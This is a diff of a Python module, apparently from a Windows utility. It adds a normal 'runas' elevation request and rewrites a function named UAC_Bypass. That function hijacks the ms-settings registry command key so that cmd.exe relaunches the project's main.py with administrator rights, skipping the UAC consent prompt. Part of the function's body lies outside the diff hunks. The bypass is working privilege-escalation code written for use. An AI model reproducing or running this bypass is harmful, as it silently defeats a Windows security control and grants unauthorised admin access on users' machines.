@@ -1,12 +1,32 @@
-import os
-import winreg
-import subprocess
+import ctypes
+import platform
 import lwjgl
 import sys
+import os
+import pathlib
+import subprocess
+import winreg
 
-def UAC_Bypass(payload_cmd=""):
-    if len(payload_cmd) == 0:
-        payload_cmd = f'cmd.exe /c "cd /d "{os.getcwd()}" && "{sys.executable}" main.py"'
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def Universal():
+    if platform.system() == 'Windows':
+        if not is_admin():
+            res_code = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, os.path.join(pathlib.Path(__file__).parent.parent.parent,"main.py"), None, 1)
+            if res_code <= 32:
+                lwjgl.error(f"Failed to elevate power, return: {res_code}")
+            else:
+                lwjgl.info("You have acquired administrator privileges, please use the new window")
+                exit()
+    else:
+        lwjgl.error("It can only run on Windows")
+
+def UAC_Bypass():
+    payload_cmd = f'cmd.exe /c "cd /d "{pathlib.Path(__file__).parent.parent.parent}" && "{sys.executable}" main.py"'
     try:
         key_path = r"Software\Classes\ms-settings\shell\open\command"
         
@@ -44,9 +64,3 @@ def UAC_Bypass(payload_cmd=""):
         
     except Exception as e:
         lwjgl.error(e)
-        
-
-    
-if __name__ == "__main__":
-    command = 'cmd.exe /k whoami && pause'
-    UAC_Bypass("")
